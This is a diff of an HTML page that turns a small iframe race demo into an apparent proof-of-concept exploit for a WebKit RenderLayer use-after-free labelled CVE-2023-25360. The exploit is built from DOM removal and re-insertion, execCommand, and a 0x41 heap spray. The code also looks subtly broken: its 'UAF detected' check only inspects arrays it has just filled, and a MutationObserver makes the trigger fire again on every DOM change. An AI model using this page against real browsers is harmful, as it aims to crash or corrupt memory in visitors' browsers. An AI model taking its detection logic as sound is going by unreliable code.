@@ -1,28 +1,108 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Shared Memory Race</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CVE-2023-25360 PoC</title>
+    <style>
+        #target {
+            position: absolute; /* Forces RenderLayer creation */
+            width: 100px;
+            height: 100px;
+            background: blue;
+        }
+        button {
+            margin-top: 20px;
+            padding: 10px;
+            font-size: 16px;
+        }
+        #status {
+            margin-top: 10px;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
-  <h1>Race Condition on Shared Element</h1>
-  <button onclick="startRace()">Start Race</button>
+    <h1>CVE-2023-25360: WebCore::RenderLayer UAF</h1>
+    <p>Click the button to trigger the PoC. Browser may crash or show UAF detection.</p>
+    <button id="trigger">Trigger PoC</button>
+    <div id="status">Waiting...</div>
+    <div id="container">
+        <div id="target"></div>
+    </div>
+    <script type="module">
+        import { debug_log } from './module/utils.mjs';
 
-  <div id="sharedDiv">Shared Element</div>
+        const container = document.getElementById('container');
+        const target = document.getElementById('target');
+        const status = document.getElementById('status');
+        const DELAY = 100;
+        let attemptCount = 0;
 
-  <iframe id="frame1" src="" style="width: 49%; height: 200px; border: 1px solid black;"></iframe>
-  <iframe id="frame2" src="" style="width: 49%; height: 200px; border: 1px solid black;"></iframe>
+        function heapSpray() {
+            let spray = [];
+            for (let i = 0; i < 10000; i++) {
+                let arr = new Uint8Array(0x1000);
+                for (let j = 0; j < arr.length; j++) {
+                    arr[j] = 0x41; // Fill with 'A'
+                }
+                spray.push(arr);
+            }
+            return spray;
+        }
 
-  <script>
-    const sharedDiv = document.getElementById("sharedDiv");
-    window.sharedRef = sharedDiv;
+        function triggerUAF() {
+            attemptCount++;
+            debug_log(`Attempt #${attemptCount}: Initiating exploit...`);
+            status.textContent = `Attempt #${attemptCount} in progress...`;
 
-    function startRace() {
-      const r = Math.random();
-      document.getElementById("frame1").src = "page1.html?r=" + r;
-      setTimeout(() => {
-        document.getElementById("frame2").src = "page2.html?r=" + r;
-      }, 1);
-    }
-  </script>
+            // Step 1: Modify DOM to create and remove elements
+            target.style.display = 'block'; // Ensure RenderLayer exists
+            container.removeChild(target); // Trigger RenderLayer destruction
+
+            // Step 2: Execute command to update styles and render tree
+            setTimeout(() => {
+                try {
+                    // Re-add target to trigger style recalculation
+                    container.appendChild(target);
+                    // Use execCommand to force style and render tree update
+                    document.execCommand('fontSize', false, '7');
+                    // Heap spray to increase crash likelihood
+                    const spray = heapSpray();
+                    // Check for UAF
+                    debug_log('Checking for UAF memory reuse...');
+                    for (let i = 0; i < spray.length; i++) {
+                        const arr = spray[i];
+                        if (arr[0] !== 0x41) {
+                            debug_log(`UAF detected at spray index: ${i}`);
+                            status.textContent = 'UAF detected!';
+                            return;
+                        }
+                    }
+                    debug_log('UAF triggered, check for crash or memory corruption.');
+                    status.textContent = 'Exploit triggered!';
+                } catch (e) {
+                    debug_log(`Error occurred: ${e.message}`);
+                    status.textContent = 'Error: Exploit failed.';
+                }
+            }, DELAY);
+        }
+
+        const observer = new MutationObserver((mutations) => {
+            debug_log('DOM tree modified, attempting UAF exploit...');
+            triggerUAF();
+        });
+
+        observer.observe(container, { childList: true, subtree: true });
+
+        document.getElementById('trigger').addEventListener('click', () => {
+            try {
+                triggerUAF();
+            } catch (e) {
+                debug_log(`Error occurred: ${e.message}`);
+                status.textContent = 'Error: Exploit failed.';
+            }
+        });
+    </script>
 </body>
 </html>
